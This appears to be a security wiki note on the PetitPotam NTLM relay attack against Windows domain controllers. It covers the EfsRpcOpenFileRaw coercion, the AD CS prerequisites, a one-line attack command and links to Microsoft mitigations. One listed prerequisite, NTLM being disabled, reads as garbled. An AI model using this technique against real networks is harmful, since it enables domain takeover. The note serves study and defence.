# PetitPotam

MS-EFSR abuse (PetitPotam)
NTLMv2 Relay Tools.

This tools use `EfsRpcOpenFileRaw` to attack `MS-EFSR` and get NTLM (domain controller) hash. You can the hash to require TGT to get admin account.

## Date

CVE-2021-36942 and patched on 2021-08-10.

## From Github

PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions :)

The tools use the LSARPC named pipe with inteface c681d488-d850-11d0-8c52-00c04fd90f7e because it's more prevalent. But it's possible to trigger with the EFSRPC named pipe and interface df1941c5-fe89-4e79-bf10-463657acf44d. It doesn't need credentials against Domain Controller :D

Disabling the EFS service seems not to mitigate the "feature".

The Python one require Impacket to be installed, the Windows PoC was done on VS 2019 Community. If compilation problem, remember to add Rpcrt4.lib in the linker. Compile in x86.

## Need

+ Certificate Registration Web Interface, by installing the Certificate Authority Web Registration role. 

+ Publicly available as an IIS-hosted ASP Web Registration application running on http://xxx/certsrv/.

+ Certificate Enrollment Service (CES) by installing the Certificate Enrollment Web Service role. Works with the Certificate Enrollment Policy (CEP) Web Service by installing the Certificate Enrollment Policy Web Service role.

+ Network Device Enrollment Services (NDES), by installing the Network Device Enrollment Services role. 

+ Registered HTTP endpoint does not have HTTPS enabled / does not have any NTLM relay protection enabled (NTLM is allowed by default).

+ GPO disables NTLM authentication or configures the associated IIS application to accept Kerberos authentication only.

## Example

```bash
$ PetitPotam.exe <Attack_IP> <DC_IP>
```

## Theory

`MS-EFSR` have function: `EfsRpcOpenFileRaw`

```
long EfsRpcOpenFileRaw(
   [in] handle_t binding_h,
   [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
   [in, string] wchar_t* FileName,
   [in] long Flags
 );
```

The used to open the encrypted object on the server for backup or restore. The encrypted object on the server is specified by the `FileName` parameter, and the type of `FileName` is UncPath.

When the format `\\IP\\C$` is specified, the lsass.exe service will access `\\IP\pipe\srvsrv`.

## Related Links

[KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)

[使用PetitPotam到NTLM中继到域管理员 | 九世的博客](https://422926799.github.io/posts/d55c75ac.html)

[GitHub - topotam/PetitPotam: PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.](https://github.com/topotam/PetitPotam)

[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)

[安全研究 | 使用PetitPotam代替Printerbug - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/282912.html)
